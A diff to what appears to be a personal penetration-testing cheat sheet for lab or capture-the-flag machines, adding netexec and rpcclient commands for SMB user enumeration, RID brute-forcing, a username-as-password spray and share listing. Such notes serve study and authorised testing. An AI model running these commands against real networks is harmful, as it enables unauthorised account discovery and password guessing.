@@ -16,6 +16,7 @@
   - [ntpdate](#ntpdate)
   - [MYSQL](#mysql)
   - [MSSQL](#mssql)
+  - [netexec](#netexec)
   - [Nslookup](#nslookup)
   - [Dig](#dig)
   - [cewl](#cewl)
@@ -479,6 +480,25 @@ python3 mssqlclient.py Administrator@10.129.201.248 -windows-auth
 select name from sys.databases
 ```
 
+### netexec
+```bash
+# if user exists, it will say "KDC_ERR_PREAUTH_FAILED"
+# if user doesn't exist, it will say "KDC_ERR_C_PRINCIPAL_UNKNOWN"
+netexec smb 10.10.x.x -k -u 'guest' -p ''
+
+# see if we can get users information through guest account(guest account has blank password)
+netexec smb 10.10.x.x -u 'guest' -p '' --users
+
+# we're using rid to find valid usernames
+netexec smb 10.10.x.x -u 'guest' -p '' --rid-brute 6000
+
+# use username as password
+# --no-bruteforce will just read the file sequentially
+netexec smb 10.x.x.x -u users.txt -p users.txt --no-bruteforce --continue-on-success
+
+netexec smb 10.x.x.x -u 'operator' -p 'operator' --shares
+```
+
 ### Nslookup
 ```bash
 nslookup $TARGET
@@ -930,6 +950,15 @@ smbmap -u username -p password -d active.htb -H 192.168.193.5
 rpcclient 10.10.10.10
 rpcclient 10.10.10.10 -U '' -N
 > enumdomusers
+
+
+>lookupnames administrator
+> get the sid and change the user side at the very last part(500)
+> user's sid start from 1000 so we can start enumerating from there
+> lookupsids S-1-5-21-4078382237-1492182817-2568127209-1000
+
+for i in $(seq 500 4000);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done
+
 ```
 
 ### SharpHound.ps1
